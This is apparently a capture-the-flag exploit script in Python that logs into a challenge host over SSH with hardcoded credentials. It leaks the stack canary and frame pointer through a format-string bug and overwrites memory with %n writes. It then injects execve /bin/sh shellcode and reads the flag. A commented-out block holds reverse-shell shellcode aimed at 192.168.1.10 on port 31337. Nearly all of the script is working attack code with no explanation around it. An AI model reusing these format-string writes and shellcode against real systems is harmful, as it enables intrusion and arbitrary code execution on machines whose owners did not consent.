# via isra
# https://gist.github.com/isra17/9c6f2b5b30a32385853c/

import paramiko
import struct
import re

client = paramiko.client.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('bin200.gosec.net', port=34627, username='useless', password='O081G7mMO88L8JOT81ix')
print('--- connected ---')
shell = client.invoke_shell()

def read_til(target):
  data = b''
  while True:
    data += shell.recv(1024)
    #print(data)
    if b'' == data:
      return
    if target in data:
      return data

def read_stack(offset):
  n = 30 - int(offset/8)
  n = str(n).encode()
  format = b'>%'+n+b'$llu'
  shell.sendall(format + b'\n')
  data = read_til(b'command')
  print('data:', data)
  (data) = re.findall(b'>(.+): command', data)[0]
  data = int(data.decode('ascii'), 10)
  bytes_data = struct.pack('<Q', data)
  data = struct.pack('>Q', data)
  data = struct.unpack('<Q', data)[0]
  print('ebp-',hex(offset),': ',hex(data),' = ', bytes_data)
  read_til(b'input>')

def read_addr(addr):
  format = b'>%14$llu:%14$s\x00\x00' + struct.pack('<Q', addr)
  shell.sendall(format + b'\n')
  data = read_til(b'command')
  print('data:', data)
  (read_addr, data) = re.findall(b'>([^:]+):([^:]+): command', data, re.S)[0]
  # import pdb;pdb.set_trace()
  read_addr = int(read_addr.decode('ascii'), 10)
  data += b'\x00' * (8 - len(data))
  data = struct.unpack('<Q', data[:8])[0]

  print(hex(addr),': ',hex(read_addr),' => ', hex(data))
  read_til(b'input>')

def write_stack(data):
  shell.sendall(data + b'\n')
  read_til(b'input>')

def write_mem(addr, value):
  n1 = value & 0xff + 0x100
  n2 = ((value >> 8) & 0xff) + 0x100 - (n1&0xff)
  n3 = ((value >> 16) & 0xff) + 0x100 - ((n2+n1)&0xff)
  n4 = ((value >> 24) & 0xff) + 0x100 - ((n3+n2+n1)&0xff)
  n1 = str(n1).encode()
  n2 = str(n2).encode()
  n3 = str(n3).encode()
  n4 = str(n4).encode()
  print('N:', n1, n2, n3, n4)
  format = b'%'+n1+b'd%18$n'
  format += b'%'+n2+b'd%19$n'
  format += b'%'+n3+b'd%20$n'
  format += b'%'+n4+b'd%21$n'
  format += b'_' * (0x30-len(format))
  format += struct.pack('<Q', addr)
  format += struct.pack('<Q', addr+1)
  format += struct.pack('<Q', addr+2)
  format += struct.pack('<Q', addr+3)
  # import pdb;pdb.set_trace()
  shell.sendall(format + b'\n')
  (read_til(b'input>'))


read_til(b'input>')

shell.sendall('>%10$x:%28$llu:%29$llu:%8$llu\n')

data = read_til(b'command').decode('ascii')
(canary, handler, next, rbp) = re.findall('>(.+):(.+):(.+):(.+): command', data)[0]
canary = int(canary, 16)
handler = int(handler, 10)
next = int(next, 10)
rbp = int(rbp, 10)
print('Canary:', hex(canary))
print('handler:', hex(handler))
print('next:', hex(next))
print('rbp:', hex(rbp))

read_til(b'input>')
# write_stack(b'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF')
# read_stack(0x90)

read_addr(0x600FD8)
write_mem(0x600FD8, (rbp & 0xFFFFFFFF) - 0x90 + 4)
write_mem(0x600FDc, rbp >> 32)
read_addr(0x600FD8)

write_stack(b'AAAAAAAABBBBBBBBstill_alive')
read_stack(0x80)

# format_code = b'%13$llu\xff' + struct.pack('Q', 0x400B40)
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# IPADDR = b"\xd1\x8d\x23\xea" # 192.168.1.10
# PORT = b"\x7a\x69" # 31337

# shellcode = \
# b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" \
# b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" \
# b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" \
# b"\x02" + PORT + b"\xc7\x44\x24\x04" + IPADDR + b"\x48\x89\xe6\x6a\x10" \
# b"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" \
# b"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" \
# b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" \
# b"\x5f\x6a\x3b\x58\x0f\x05"

# blacklist = [0, 0x20,0x0c,0x0a,0x0d,0x09,0x0b,0x7f]

payload = b'end\x00' + shellcode
print('len:', len(payload))
shell.sendall(payload + b'\n')
# write_stack(payload)
print(shell.recv(1024))
print(shell.recv(1024))
shell.sendall('cat flag.txt\n')
print(shell.recv(1024))
print(shell.recv(1024))
